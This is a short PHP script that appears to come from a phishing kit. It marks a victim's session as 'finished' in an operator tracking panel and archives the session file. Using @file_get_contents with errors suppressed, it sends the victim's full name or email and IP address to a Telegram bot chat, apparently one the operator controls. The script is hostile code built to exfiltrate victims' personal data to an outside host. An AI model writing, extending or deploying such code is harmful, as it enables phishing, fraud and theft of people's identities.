<?php
session_start();
require_once '../config.php';
require_once '../functions.php';
require_once __DIR__ . '/panel_bridge.php';

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['ok' => false]);
    exit;
}

$ip = _ip();
$email = $_SESSION['email'] ?? 'N/A';
$firstName = $_SESSION['firstName'] ?? '';
$lastName = $_SESSION['lastName'] ?? '';
$fullName = trim("$firstName $lastName") ?: $email;

$message = "🏁 <b>{$fullName}</b> a terminé !

┊ 🪼 IP : <code>{$ip}</code>
┊ 🪼 " . date('d/m H:i') . "
";

@file_get_contents('https://api.telegram.org/bot' . $token . '/sendMessage?chat_id=' . $id_trash . '&text=' . urlencode($message) . '&parse_mode=HTML');

panelSessionAddStep('finished');
panelSessionUpdate(['is_online' => false, 'status' => 'finished']);

$panelId = $_SESSION['panel_session_id'] ?? null;
if ($panelId) {
    $src = dirname(__DIR__) . '/panel/data/sessions/' . $panelId . '.json';
    $dst = dirname(__DIR__) . '/panel/data/archive/' . $panelId . '.json';
    if (file_exists($src)) {
        @rename($src, $dst);
    }
}

session_destroy();
echo json_encode(['success' => true]);
